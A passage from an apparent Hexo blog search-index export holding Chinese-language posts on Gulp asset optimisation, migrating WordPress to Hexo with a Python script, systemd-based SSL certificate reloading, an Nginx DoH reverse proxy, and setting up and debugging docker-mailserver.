'rev'\n));\n```\n\n该文件首先定义了四个任务，前三个任务分别优化css、js、html文件的大小，第四个任务用来为css、js的文件名添加hash值标签，默认生成8位的hash值，同时处理所有html，将其中对本地css、js文件的引用处修改为带hash标签的。\n\n最后定义了一个默认任务，用以在执行`gulp`命令而不带任何参数时自动执行前面四个任务。\n\n## 配置npm脚本\n\n在package.json中添加`scripts`字段，配置脚本：\n\n```json\n...\n  \"scripts\": {\n    \"b\": \"npx hexo clean && npx hexo g && gulp\",\n    ...\n  }\n...\n```\n\n这样只要在项目的根目录下执行`npm run b`，就可以直接完成编译+优化+添加版本一条龙。\n\n---\n\n最近发现有个奇怪的bug，我只要用了`gulp-html-minifier-terser`，就会有一个html文件被”优化”成了空文件，研究了下发现原来不应该将最后的`rev`任务和前面三个并行起来，改成下面这样就好了:\n\n```js\ngulp.task('default', gulp.series(\n    gulp.parallel('minify-css', 'minify-js', 'minify-html'),\n    'rev'\n));\n```\n\n","tags":["Web前端","npm","NodeJS","Gulp","Hexo"],"categories":["博客相关"]},{"title":"迁移WordPress到静态博客","url":"//blog/11025/","content":"\n用WordPress写个人博客四年后，我终于下定决心把它迁移到了静态博客。本文是我使用Hexo框架写的第一篇文章。\n\n---\n\n## 迁移的动机\n\n- MySQL数据库占用的内存实在是太多了\n- 有后台的博客虽然管理起来方便，但十分臃肿，而且会有补不完的漏洞\n- 用Markdown来写文章十分简约，同时也很方便\n- 比起PHP，我更愿意学习前端那一套框架\n- 正好前段时间研究了如何将文章转成Markdown，满足了迁移的前置条件\n- ~~发现大佬们似乎都是静态博客，跟个风~~\n\n## 迁移的过程\n\nWordPress和Hexo对文章的处理有非常大的区别，因此我在这里将我主要遇到的问题、需要满足的需求及解决方法记录了一下。\n\n### 将全站文章导出为Markdown\n\n由于Hexo使用Markdown来写文章，因此必不可少的操作——将所有文章导出为Markdown格式。\n\n事实上，目前已经有不少**WordPress to Hexo**的迁移工具了，然而这些工具基本都很难完全满足我的需求，我需要一种可高度自定义的迁移方法来应对我的一些奇奇怪怪的需求。\n\n如[上一篇文章](/blog/10094/)所述，我已经找到了一种令我比较满意的转换方法，不过当时的目的只是随意转换一下，看着舒服就行，在实际进行迁移操作时，又根据需求增加了不少细节。\n\n- 保持文章的`permalink`不变\n\n我之前的博客中文章的永久链接都是`/blog/id/`这种形式，我希望在新的博客下保持原有的永久链接格式。基于此需求，我为所有导出的文章自定义了front-matter，增加了`id`字段，并且在Hexo配置文件中设置：\n\n```yaml\npermalink: /blog/:id/\n```\n\n- 下载所有静态文件到本地（以后再考虑使用第三方对象存储服务）\n\n我的博客中静态文件除掉css、js等文件以外，还包含图片、音频、pdf，甚至zip压缩包，并且它们在我原来网站上的路径可能非常复杂，例如`/wp-content/uploads/2021/06/xxx.jpeg`，对于这些文件，我自然不希望它们保留原始路径（早知道以前就用第三方对象存储服务了。。。这样就能省事好多），这里可以开启Hexo的post asset folder功能：\n\n```yaml\npost_asset_folder: true\n```\n\n然后创建与post文件同路径、同名的目录，将每篇文章包含的静态文件下载到对应的asset目录下。\n\n之后只需要正则匹配所有长得像文件的链接：\n\n```plaintext\nhttps\\:\\/\\/blog\\.fyz666\\.xyz\\/[a-zA-Z\\d\\/_-]*\\.[a-zA-Z\\d_%@#-]+(?:\\.[a-zA-Z\\d_%@#-]+)*\n```\n\n路径上至少包含一组`.xxx`结构的链接，大概率就是文件了，反正应该不至于出现太奇怪的东西。\n\n- 代码块语言标注\n\n在WordPress中，我使用[EnlighterJS](https://github.com/EnlighterJS/EnlighterJS)进行代码块高亮，而Hexo默认使用[highlight.js](https://highlightjs.org/)进行代码块高亮，虽然highlight.js自带`auto_detect`功能可以自动识别代码块的语言，但当代码比较短或缺乏对应语言的特点时，自动识别的效果就不太好。而手动为所有文章的代码块标注语言又太过繁琐，因此我研究了一下，发现feedparser支持一个解析参数：`sanitize_html=False`，可以禁止它对HTML文本进行净化，从而保留一些我需要的东西，例如代码块的语言。\n\n- 保留一些Markdown语法中没有的元素\n\n部分文章含有音频标签`<audio>`，很多文章都含有删除线`<s>`或`<del>`，然而markdownify的默认规则会直接忽略它们，可以通过自定义解析规则来保留。\n\n- 站内文件需要屏蔽pjax，不然会出问题\n\n通过手动给这类链接增加一个`target=\"_blank\"`来实现：\n\n```python\nfile_exts = {\n    '.pdf', '.jpg', '.jpeg', '.png', '.svg', '.jfif',\n    '.wav', '.mp4', '.mp3', '.webm', '.ogv',\n    '.zip', '.rar', '.gz', '.7z', '.tar', '.xz',\n    '.pdf', '.bat'\n}\n...\nif href.startswith(home_url) and ext.lower() in file_exts:\n    return f\"\"\"<a target=\"_blank\" href=\"{href}\" rel=\"external\" title=\"{title_part}\">{text}</a>\"\"\"\n```\n\n### 适配Gitalk\n\n之前在动态博客里插入Gitalk只需要在几个PHP文件里写上下面内容即可：\n\n```js\nconst gitalk = new Gitalk({\n    clientID: 'xxxxxxxxxxxxxxxx',\n    clientSecret: 'xxxxxxxxxxxxxxxx',\n    body: location.href,\n    repo: 'BlogComments',\n    owner: 'windshadow233',\n    admin: ['windshadow233'],\n    createIssueManually: true,\n    id: location.pathname,\n    distractionFreeMode: false\n});\ngitalk.render('gitalk-container');\n```\n\n而显然，这样的写法在静态博客中是达不到我想要的效果的，因为静态博客在编译时并不会把`location.pathname`和`location.href`动态解析为用户访问时的链接。所以需要对主题文件中对Gitalk的导入部分进行修改。\n\n该文件在butterfly主题下位于`themes/butterfly/layout/includes/third-party/comments/gitalk.pug`，我将下面这部分进行了一定的修改：\n\n```diff\n@@ -9,7 +9,8 @@\n         repo: '!{repo}',\n         owner: '!{owner}',\n         admin: ['!{admin}'],\n-        id: '!{md5(page.path)}',\n+        id: '!{page.path}',\n+        body: '!{page.permalink}',\n         updateCountCallback: commentCount\n       },!{JSON.stringify(option)}))\n```\n\n这样Hexo在编译时就会将这些参数读取出来，然后写死在每个html文件里，从而达到我想要的效果。\n\n---\n\n要做的工作大概就这些，其他问题等遇到了再手动修改即可。最后附上我的迁移代码：\n\n## Python脚本\n\n```python\nimport feedparser\nimport time\nimport os\nimport re\nimport tqdm\nimport requests\nfrom markdownify import MarkdownConverter, chomp\nfrom retry import retry\n\n\nfile_exts = {\n    '.pdf', '.jpg', '.jpeg', '.png', '.svg', '.jfif',\n    '.wav', '.mp4', '.mp3', '.webm', '.ogv',\n    '.zip', '.rar', '.gz', '.7z', '.tar', '.xz',\n    '.pdf', '.bat'\n}\n\nlanguage_alias = {\n    'generic': 'plaintext',\n    'shell': 'bash'\n}\n\nfeed_url = 'https://blog.fyz666.xyz/feed/'\nhome_url = 'https://blog.fyz666.xyz/'\n\n\nclass CustomConverter(MarkdownConverter):\n    \"\"\"\n    Create a custom MarkdownConverter that adds two newlines after an image\n    \"\"\"\n\n    def convert_del(self, el, text, convert_as_inline):\n        return str(el)\n\n    def convert_s(self, el, text, convert_as_inline):\n        return str(el)\n\n    def convert_audio(self, el, text, convert_as_inline):\n        return str(el)\n\n    def convert_sup(self, el, text, convert_as_inline):\n        return str(el)\n\n    def convert_sub(self, el, text, convert_as_inline):\n        return str(el)\n\n    def convert_a(self, el, text, convert_as_inline):\n        prefix, suffix, text = chomp(text)\n        if not text:\n            return ''\n        href = el.get('href')\n        title = el.get('title')\n        ext = os.path.splitext(href)[-1]\n        title_part = ' \"%s\"' % title.replace('\"', r'\\\"') if title else ''\n        if href.startswith(home_url) and ext.lower() in file_exts:\n            return f\"\"\"<a target=\"_blank\" href=\"{href}\" rel=\"external\" title=\"{title_part}\">{text}</a>\"\"\"\n        return f'{prefix}[{text}]({href}{title_part}){suffix}' if href else text\n\n    def convert_pre(self, el, text, convert_as_inline):\n        if not text:\n            return ''\n        language = el.attrs.get('data-enlighter-language')\n        language = language_alias.get(language, language)\n        return f\"\"\"\\n```{language}\\n{text}\\n```\\n\"\"\"\n\n    def convert_div(self, el, text, convert_as_inline):\n        if el.attrs.get('class') == 'introduce':\n            return f\"\"\"<div class=\"introduce\">{text}</div>\"\"\"\n        return text\n\n\ndef md(html, **options):\n    return CustomConverter(**options).convert(html)\n\n\nclass WordPress2MD(object):\n    def __init__(self, feed_url, home_url, out_folder='output', download_files=True):\n        self.url = feed_url\n        self.home = home_url\n\n        self.out_folder = out_folder\n        self.download_files = download_files\n\n    @retry(tries=5, delay=1)\n    def get_cover(self, file_name, id_):\n        if os.path.isfile(os.path.join(self.out_folder, file_name)):\n            with open(os.path.join(self.out_folder, file_name), 'r') as f:\n                lines = f.readlines()\n                for line in lines:\n                    if line.startswith('cover'):\n                        cover = line.split(': ')[1].strip()\n                        return cover\n        info_url = self.home + f'wp-json/wp/v2/posts/{id_}'\n        r = requests.get(info_url).json()\n        if r['featured_media'] == 0:\n            return ''\n        id_ = r['featured_media']\n        media_url = self.home + f'wp-json/wp/v2/media/{id_}'\n        r = requests.get(media_url).json()\n        return r['source_url']\n\n    def make_assets_folder(self, asset_folder):\n        os.makedirs(os.path.join(self.out_folder, asset_folder), exist_ok=True)\n\n    @retry(tries=5, delay=1)\n    def download_asset_file_and_replace(self, file_url, assets_folder, md_content):\n        filename = os.path.split(file_url)[1]\n        folder = os.path.join(self.out_folder, assets_folder)\n        if os.path.exists(os.path.join(folder, filename)):\n            return md_content.replace(file_url, filename)\n        r = requests.get(file_url)\n        with open(os.path.join(folder, filename), 'wb') as f:\n            f.write(r.content)\n        md_content = md_content.replace(file_url, filename)\n        return md_content\n\n    def find_and_replace_asset_files(self, assets_folder, md_content):\n        pattern = re.compile(f'{self.home}[a-zA-Z\\d\\/_-]*\\.[a-zA-Z\\d_%@#-]+(?:\\.[a-zA-Z\\d_%@#-]+)*')\n        files = pattern.findall(md_content)\n        for file in tqdm.tqdm(set(files), desc=f\"Downloading files to {assets_folder}\"):\n            try:\n                if file.endswith('.php'):\n                    continue\n                md_content = self.download_asset_file_and_replace(file, assets_folder, md_content)\n            except Exception as e:\n                print(file, assets_folder, e)\n        return md_content\n\n    def html2md(self, html_text):\n        return md(html_text, bullets='-', escape_underscores=False, heading_style='atx').strip()\n\n    def parse_entry(self, entry):\n        title = entry['title']\n        date = entry['published_parsed']\n        id_ = entry['id'].rsplit('?p=')[1]\n        base_name = title.replace(os.sep, \"|\").replace(' ', '-')\n        file_name = base_name + '.md'\n        category, *tags = [_['term'] for _ in entry.get('tags', [])]\n        cover = self.get_cover(file_name, id_)\n        meta = \"---\\n\" \\\n               f\"title: {title}\\n\" \\\n               f\"id: {id_}\\n\" \\\n               f\"date: {time.strftime('%Y-%m-%d %H:%M:%S', date)}\\n\" \\\n               f\"categories: [{category}]\\n\" \\\n               f\"tags: {tags}\\n\" \\\n               f\"cover: {cover}\\n\" \\\n               f\"disableNunjucks: true\\n\" \\\n               f\"---\\n\\n\"\n\n        content = entry['content'][0]['value']\n        md_content = meta + self.html2md(content).rsplit('\\n\\n', 1)[0]\n        if self.download_files:\n            assets_folder = base_name\n            self.make_assets_folder(assets_folder)\n            md_content = self.find_and_replace_asset_files(assets_folder, md_content)\n        with open(os.path.join(self.out_folder, file_name), 'w') as f:\n            f.write(md_content)\n\n    def parse(self, title=None):\n        os.makedirs(self.out_folder, exist_ok=True)\n        feed = feedparser.parse(self.url, sanitize_html=False)\n        for entry in tqdm.tqdm(feed.entries):\n            if title is not None:\n                if title == entry['title']:\n                    self.parse_entry(entry)\n                    break\n            else:\n                self.parse_entry(entry)\n        else:\n            if title is not None:\n                print('Article not found!')\n\n\nwp2md = WordPress2MD(feed_url, home_url, '_posts', True)\nwp2md.parse()\n```","tags":["Python","WordPress","Hexo"],"categories":["博客相关"]},{"title":"将WordPress文章转化为Markdown格式","url":"//blog/10094/","content":"\n在某些时候，我有将我的博客文章转化为markdown的需求，我的博客是用WordPress写的，想改静态博客但暂时懒得折腾，于是找了个折中的办法。\n\n{% note info %}\n\n然而刚写完这篇文章没多久就迁Hexo了，正好把本文提到的转换方法用了起来。\n\n{% endnote %}\n\nGitHub上有不少WordPress转Markdown的脚本，大多是通过解析WordPress导出的xml文件实现转换，但实测效果则非常一般了，因为导出的内容中会含有大量类似这样的东西：`<!-- wp:paragraph -->`，虽然大部分markdown渲染器会忽略这些内容，但看着还是很乱七八糟，另外如果文中有自定义的block，还会出现下面这种没有解析的内容：\n\n```plaintext\n<!-- wp:block-lab/download {\"url\":\"https://xxx.com\",\"text\":\"xxx\"} /-->\n```\n\n这些脚本还经常处理不好文本换行，导致解析出来的文件里许多本该换行的文字挤在一团。虽然可以手动调整以达到过得去的效果，但十分费时费眼。\n\n\n注意到rss订阅链接返回的数据包含了文章内容的纯HTML文本，于是想到可以用HTML来转markdown，将两种规范的标记语言进行互相转换应该问题会小很多。对于这一需求，已经有比较成熟的软件支持了，例如[pandoc](https://github.com/jgm/pandoc)，不过这个软件支持转换的文件类型非常多，对我来说好像暂时有点浪费，于是我找了一种比较轻量的方法，即写Python脚本解决，我找到了两个库，一个用来解析rss订阅，一个用来做html转换到markdown的工作：\n\n```bash\npip install feedparser\npip install markdownify\n```\n\n脚本如下：\n\n```python\nimport feedparser\nfrom markdownify import markdownify as md\nimport time\nimport os\n\n\nclass RSS2MD(object):\n    def __init__(self, url, out_folder='output'):\n        self.url = url\n        self.out_folder = out_folder\n\n    def parse_entry(self, entry):\n        title = entry['title']\n        link = entry['link']\n        date = entry['published_parsed']\n        tags = [_['term'] for _ in entry.get('tags', [])]\n        meta = \"---\\n\" \\\n               f\"title: {title}\\n\" \\\n               f\"slug: {link}\\n\" \\\n               f\"date: {time.strftime('%Y-%m-%d', date)}\\n\" \\\n               f\"tags: {tags}\\n\" \\\n               f\"---\\n\\n\"\n\n        content = entry['content'][0]['value']\n        md_content = meta + md(html_text, bullets='-', escape_underscores=False).strip().rsplit('\\n\\n', 1)[0]\n        file_name = title.replace(os.sep, \"|\") + '.md'\n        with open(os.path.join(self.out_folder, file_name), 'w') as f:\n            f.write(md_content)\n\n    def parse(self):\n        os.makedirs(self.out_folder, exist_ok=True)\n        feed = feedparser.parse(self.url)\n        for entry in feed.entries:\n            self.parse_entry(entry)\n\n\nrss2md = RSS2MD('https://blog.fyz666.xyz/feed/', 'output')\nrss2md.parse()\n```\n\nmarkdownify这个库支持非常高自由度的配置，转化的效果也非常OK。\n\n\n不过有一个小问题，那就是WordPress的rss订阅会把文中出现的emoji转化为img标签，指向一个域名为s.w.org的链接，似乎是为了兼容各种古早版本的阅读器，然而我并不需要这部分功能，于是可以在WordPress的`functions.php`文件加入以下代码来禁用此功能：\n\n```php\nremove_action('wp_head', 'print_emoji_detection_script', 7);\nremove_action('admin_print_scripts', 'print_emoji_detection_script');\nremove_action('wp_print_styles', 'print_emoji_styles');\nremove_action('admin_print_styles', 'print_emoji_styles'); \nremove_filter('the_content_feed', 'wp_staticize_emoji');\nremove_filter('comment_text_rss', 'wp_staticize_emoji'); \nremove_filter('wp_mail', 'wp_staticize_emoji_for_email');\n```","tags":["Python","WordPress","Markdown"],"categories":["博客相关"]},{"title":"优雅地管理SSL证书及其关联服务","url":"//blog/10068/","content":"\n我的服务器上开着一堆服务，其中有一些需要用到SSL证书，例如Nginx及前面刚刚部署的邮件服务。我的SSL证书是通过certbot向Let's Encrypt申请的，证书有效期为90天，也就是说每隔80多天就得更新一下证书。\n\n## 动机\n\n在证书更新后，自然需要将所有用到证书的服务reload一下，以加载新的证书，通常我会写一条crontab作业来干这件事。之前我只有一台服务器A跑Nginx服务的时候，这样感觉还比较舒服，而现在情况变得更加复杂了：\n\n这两年我都在维护我们实验室主办的学术会议的官网（规模不大，因此把官网部署在我的服务器上完全没问题），所以需要同时维护两个域名的证书。另外，我现在还同时维护着另一台B服务器——两台服务器上的服务共享着同一个域名证书，所以需要在A服务器上的证书更新时同步到B服务器上，并在B服务器上reload所有用到证书的服务。\n\n于是原先的方法感觉就不太优雅了。正巧这两天iBug大佬发布了一篇文章，介绍了一种通过systemd来reload一些服务的方法：\n\n{% link Reload SSL certificates with systemd,iBug,https://ibug.io/blog/2024/03/reload-ssl-cert-with-systemd/ %}\n\n看上去非常优雅，于是我学习了一下，也给整了起来。\n\n## 服务器A上的操作\n\n\n首先我将申请证书的脚本从certbot换成了更轻量的[acme.sh](https://github.com/acmesh-official/acme.sh)，安装完成后直接支持通过接入cloudflare以及godaddy的dns api来更新泛域名证书（而certbot则需要分别安装两者的插件，感觉稍显笨重）\n\n\n我将A服务器作为更新证书的机器，更新证书后自动同步给B，在A服务器上只有Nginx服务需要reload，因此先创建`/etc/systemd/system/ssl-certificate.target`：\n\n```bash\n# /etc/systemd/system/ssl-certificate.target\n[Unit]\nDescription=SSL certificates reload helper\nPropagatesReloadTo=nginx.service\n```\n\n然后创建一个path文件`/etc/systemd/system/ssl-certificate.path`来监听证书文件的变更事件：\n\n```bash\n# /etc/systemd/system/ssl-certificate.path\n[Unit]\nDescription=SSL certificate reload helper\nWants=%N.target\n\n[Path]\nPathChanged=/path/to/cert1/fullchain.cer\nPathChanged=/path/to/cert2/fullchain.cer\n\n[Install]\nWantedBy=multi-user.target\n```\n\n我有两个证书，所以这里加了两条`PathChanged`字段分别监听证书1和证书2的变更事件。\n\n\n最后由于path单元只能激活服务而没办法重载服务，所以需要创建一个“一次性”的（oneshot）service，每次激活时来reload服务：\n\n`/etc/systemd/system/ssl-certificate.service`\n\n```bash\n# /etc/systemd/system/ssl-certificate.service\n[Unit]\nDescription=SSL certificate reload helper\nStartLimitIntervalSec=5s\nStartLimitBurst=2\n\n[Service]\nType=oneshot\nExecStart=/bin/sh -c '/bin/systemctl reload %N.target; /usr/local/bin/rsync_cert.sh'\n```\n\n这里我需要额外执行的工作还有向B服务器同步证书1，因此采用了将两条命令写在一起的方式。同步证书则使用了`rsync`命令。\n\n`/usr/local/bin/rsync_cert.sh`\n\n```bash\n#!/bin/bash\n\nrsync -avzL -e 'ssh -i /path/to/priv_key' /path/to/cert1/ user@serverB:/path/to/cert1/\n```\n\n需要先手动执行一下这个脚本将服务器B的公钥写入到`~/.ssh/known_hosts`，后面就能自动化了。\n\n\n最后启动创建的path单元：\n\n```bash\nsystemctl daemon-reload\nsystemctl enable --now ssl-certificate.path\n```\n\n## 服务器B上的操作\n\n\n在服务器B上，同样可以创建与前面相似的`target`、`path`及`service`单元，这样当新的证书同步过去后，也会触发reload。\n\n\n由于我的mailserver是部署在docker里的，好像不太好通过systemd来维护，因此同样采用了这种更愚蠢的办法，只是因为命令比较多，就干脆专门写了一个文件：\n\n`/etc/systemd/system/ssl-certificate.service`\n\n```bash\n# /etc/systemd/system/ssl-certificate.service\n[Unit]\nDescription=SSL certificate reload helper\nStartLimitIntervalSec=5s\nStartLimitBurst=2\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/reload-services.sh\n```\n\n`/usr/local/bin/reload-services.sh`\n\n```bash\n#!/bin/bash\n\nset +e\n\n/bin/systemctl reload ssl-certificate.target\n\n/bin/docker exec mailserver postfix reload\n/bin/docker exec mailserver dovecot reload\n```\n\n如此配置，当SSL证书更新时，两台服务器上的所有相关服务都可以顺利自动重新加载证书了！\n","tags":["Linux","SSL"],"categories":["瞎捣鼓经历"]},{"title":"使用Nginx反向代理DoH服务","url":"//blog/10026/","content":"\nDoH（DNS over Https）是一种通过HTTPS来进行DNS解析的协议，它使用HTTPS协议加密DoH客户端和基于DoH的DNS解析程序之间的数据，防止中间人对DNS数据的窃听和操纵，从而提高客户端隐私和安全性。\n\n国内外都有一些服务商提供公共的DoH服务，不过由于一些众所周知的原因，我会更倾向于使用国外服务商的DoH，随便列举几条比较知名的：\n\n\n- OpenDNS: `https://doh.opendns.com/dns-query`\n- CloudFlare: `https://cloudflare-dns.com/dns-query`\n- dns.sb: `https://doh.dns.sb/dns-query`\n- Google: `https://dns.google/resolve`\n- IBM Quad9: `https://dns.quad9.net:5053/dns-query`\n\n同样的，由于一些原因，我们访问这些服务会有些困难。考虑到我有一台位于海外的云服务器，因此可以考虑通过Nginx做一个反向代理，来间接访问这些服务。下面是我配置的反向代理：\n\n```nginx\nupstream google{\n  server 8.8.8.8:443;\n  server 8.8.4.4:443;\n}\n\nupstream cloudflare{\n  server 104.16.249.249:443;\n  server 104.16.248.249:443;\n}\n\nupstream sbdns{\n  server 185.222.222.222:443;\n  server 103.121.210.210:443;\n  server 202.5.221.130:443;\n  server 202.5.221.131:443;\n  server 202.5.221.132:443;\n  server 202.5.221.133:443;\n  server 202.5.221.134:443;\n  server 45.125.0.26:443;\n  server 165.22.61.129:443;\n}\n\nupstream opendns{\n  server 146.112.41.2:443;\n}\n\nupstream ibm-quad9{\n  server 9.9.9.9:5053;\n  server 149.112.112.112:5053;\n}\n\nserver{\n  ...\n  location /query-google{\n    proxy_pass https://google/resolve;\n    proxy_set_header Host dns.google;\n    proxy_set_header accept application/dns-json;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_pass_request_headers on;\n  }\n  location /query-cf{\n    proxy_pass https://cloudflare/dns-query;\n    proxy_set_header Host cloudflare-dns.com;\n    proxy_set_header accept application/dns-json;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_pass_request_headers on;\n  }\n  location /query-sb{\n    proxy_pass https://sbdns/dns-query;\n    proxy_set_header Host doh.sb;\n    proxy_set_header accept application/dns-json;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_pass_request_headers on;\n  }\n  location /query-ibm{\n    proxy_pass https://ibm-quad9/dns-query;\n    proxy_set_header Host dns.quad9.net;\n    proxy_set_header accept application/dns-json;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_pass_request_headers on;\n  }\n  location /{\n    default_type text/html;\n    return 418 \"I'm a teapot\";\n  } \n}\n```\n\n如此，就可以通过这个反向代理来对这些海外公共DoH服务进行访问了，使用的方法也很简单，可以用[cloudflared](https://github.com/cloudflare/cloudflared)将其部署在树莓派之类的设备上。\n\n\n为了避免通过域名DoH来解析自己导致死循环，可以加一个本地host。\n","tags":["Nginx","DNS","反向代理","DNS over HTTPS"],"categories":["瞎捣鼓经历"]},{"title":"自部署邮箱接收不到某些邮件的原因排查","url":"//blog/10001/","content":"\n用上自部署邮箱后，我就将一些社交平台的绑定邮箱换成了自己的新邮箱。然而某些平台的验证邮件却始终无法收到——即使在垃圾邮件箱。\n\n- Twitter\n\n查看日志后发现以下内容：\n\n```raw\nMar 24 03:13:07 mail postfix/smtpd[27111]: connect from spruce-goose-al.twitter.com[199.59.150.81]\nMar 24 03:13:07 mail postfix/smtpd[27111]: Anonymous TLS connection established from spruce-goose-al.twitter.com[199.59.150.81]: TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits)\nMar 24 03:13:08 mail postfix/smtpd[27111]: CD556EB3A9: client=spruce-goose-al.twitter.com[199.59.150.81]\nMar 24 03:13:09 mail opendkim[695]: CD556EB3A9: spruce-goose-al.twitter.com [199.59.150.81] not internal\nMar 24 03:13:14 mail postfix/cleanup[27120]: CD556EB3A9: milter-reject: END-OF-MESSAGE from spruce-goose-al.twitter.com[199.59.150.81]: 5.7.1 rejected by DMARC policy for x.com; from=<n08055319d2-77aa9b8824bc4a3a-me===mail.fyz666.xyz@bounce.x.com> to=<me@mail.fyz666.xyz> proto=ESMTP helo=<spruce-goose-al.x.com>\nMar 24 03:13:19 mail postfix/smtpd[27111]: disconnect from spruce-goose-al.twitter.com[199.59.150.81] ehlo=2 starttls=1 mail=1 rcpt=1 data=0/1 quit=1 commands=6/7\n```\n\n发现这封来自twitter的邮件似乎因为DMARC验证失败而被reject了：rejected by DMARC policy for x.com;\n\n~~看来应该是twitter的锅。~~考虑到之前DMARC的DNS解析内容是`v=DMARC1; p=quarantine;` 为了能正常接收到邮件，根据[这个文档](https://github.com/internetstandards/toolbox-wiki/blob/main/DMARC-how-to.md#overview-of-dmarc-configuration-tags)的解释，我尝试了一下将这里p的值改成了`none`。\n\n\n过了一段时间等DNS缓存刷新后再次进行尝试，发现可以正常收到邮件了。\n\n\n---\n\n- Oray\n\n\n```raw\nMar 25 22:44:09 mail policyd-spf[507719]: prepend Received-SPF: None (mailfrom) identity=mailfrom; client-ip=140.205.208.10; helo=out208-10.dm.aliyun.com; envelope-from=no-reply@news.oray.cn; receiver=<UNKNOWN>\nMar 25 22:44:09 mail opendmarc[703]: 44B5BEB3AD: news.oray.cn none\nMar 25 22:44:09 mail postfix/qmgr[162952]: 44B5BEB3AD: from=<no-reply@news.oray.cn>, size=3073, nrcpt=1 (queue active)\nMar 25 22:44:09 mail amavis[162976]: (162976-16) Blocked BAD-HEADER-0 {BouncedInbound,Quarantined}, [140.205.208.10]:45205 [140.205.208.10] <no-reply@news.oray.cn> -> <me@mail.fyz666.xyz>, quarantine: V/badh-V4on_mWyAIEY, Queue-ID: 44B5BEB3AD, mail_id: V4on_mWyAIEY, Hits: -, size: 2953, 72 ms\nMar 25 22:44:15 mail postfix/smtp[507949]: EB1C6EB3EA: to=<no-reply@news.oray.cn>, relay=mx100.olivemail.net[119.38.129.76]:25, delay=5.3, delays=0.01/0.01/2/3.2, dsn=5.0.0, status=bounced (host mx100.olivemail.net[119.38.129.76] said: 550 User not found: no-reply@news.oray.cn (in reply to RCPT TO command))\n```\n\n好像是[Amavis](https://en.wikipedia.org/wiki/Amavis)把它拦了。Amavis是一个开源的电子邮件内容过滤器，这里的日志提到了BAD-HEADER-0，应该是邮件头部之类的问题。查到[这个issue](https://github.com/docker-mailserver/docker-mailserver/issues/1498)，为了解决这个问题，可以直接将这个头部过滤策略去掉。\n\n\n新建`docker-data/dms/config/amavis.cf`文件，写入下面内容：\n\n```plaintext\n$final_bad_header_destiny = D_PASS;\n$bad_header_quarantine_to = undef;\n```\n\n然后重启容器即可。\n\n\n注意，重启docker-mailserver不能使用`docker restart`命令，而必须先`docker compose down`再`docker compose up -d`\n","tags":["Email","Docker-mailserver"],"categories":["Debug"]},{"title":"自建docker-mailserver邮件服务器","url":"//blog/9930/","content":"\n大约两年前我就想过整一个自己域名的邮件服务，这样就可以随意注册邮箱账号了，~~而且看上去很帅~~。然而这件事却一拖再拖，到今天总算是整上了，于是就在这里记录一下整的过程。\n\n![](https://oss.fyz666.xyz/blogfiles/png/0455fced579cc6ca57b6e07c464dd553.png)\n我所使用的服务器是腾讯云的轻量应用服务器，地域在新加坡，配置是最low的2核2G入门型，由于配置比较低还跑了一些其他的服务，我只能放弃一些诸如mailcow这样的选项，最后选择的是比较轻量的[docker-mailserver](https://github.com/docker-mailserver/docker-mailserver/)，不开启反病毒功能的前提下内存占用比较少。\n\n\n## 一些约定\n\n\n为了方便描述，本文中出现的下面内容均为示例，需要替换为实际值。\n\n\n- 一级域名：example.com\n- 邮件服务器域名：mail.example.com\n- 主机IP地址：1.2.3.4\n- 邮件用户名：admin\n- 邮件用户密码：password\n\n涉及到的所有DNS解析，均只写主机名，而省略一级域名example.com。\n\n\n## 开启端口\n\n\n邮件服务器需要用到的端口非常多，首先需要确保没有其他进程占用这些端口，并将它们打开：\n\n\n- 25：SMTP（显式TLS端口，不可用于身份认证）\n- 143：IMAP4（显式TLS端口）\n- 465：ESMTP（隐式TLS端口）\n- 587：ESMTP（显式TLS端口）\n- 993：IMAP4 (隐式TLS端口)\n- 110：POP3\n- 995：POP3（TLS端口）\n\n其中25端口被一些国内主机商默认封锁，需要手动申请解封。我的服务器好像没有封，不拿来发邮件感觉问题不大。\n\n\n对于这些乱七八糟的端口的理解可以参考[这个链接](https://docker-mailserver.github.io/docker-mailserver/latest/config/security/understanding-the-ports/#overview-of-email-ports)。\n\n\n## 解析DNS\n\n\n在开始之前，需要做几条基本的DNS解析。\n\n\n- A记录：`mail -> 1.2.3.4`\n- MX记录：`mail -> mail.example.com`\n\n## 正式开始安装\n\n### 下载、修改配置文件\n\n```bash\nmkdir mailserver && cd mailserver\n\nDMS_GITHUB_URL='https://raw.githubusercontent.com/docker-mailserver/docker-mailserver/master'\nwget \"${DMS_GITHUB_URL}/compose.yaml\"\nwget \"${DMS_GITHUB_URL}/mailserver.env\"\nwget \"${DMS_GITHUB_URL}/setup.sh\"\n\nchmod +x setup.sh\n```\n\n\n\n---\n\n修改compose.yaml：\n\n```yaml\nservices:\n  mailserver:\n    image: ghcr.io/docker-mailserver/docker-mailserver:latest\n    container_name: mailserver\n    # Provide the FQDN of your mail server here (Your DNS MX record should point to this value)\n    hostname: mail.example.com\n    env_file: mailserver.env\n    # More information about the mail-server ports:\n    # https://docker-mailserver.github.io/docker-mailserver/latest/config/security/understanding-the-ports/\n    # To avoid conflicts with yaml base-60 float, DO NOT remove the quotation marks.\n    ports:\n      - \"25:25\"    # SMTP  (explicit TLS => STARTTLS, Authentication is DISABLED => use port 465/587 instead)\n      - \"143:143\"  # IMAP4 (explicit TLS => STARTTLS)\n      - \"465:465\"  # ESMTP (implicit TLS)\n      - \"587:587\"  # ESMTP (explicit TLS => STARTTLS)\n      - \"993:993\"  # IMAP4 (implicit TLS)\n      - \"110:110\"  # POP3\n      - \"995:995\"  # POP3 (with TLS)\n    volumes:\n      - /root/.certificates/:/etc/letsencrypt/  # 挂载证书\n      - ./docker-data/dms/mail-data/:/var/mail/\n      - ./docker-data/dms/mail-state/:/var/mail-state/\n      - ./docker-data/dms/mail-logs/:/var/log/mail/\n      - ./docker-data/dms/config/:/tmp/docker-mailserver/\n      - 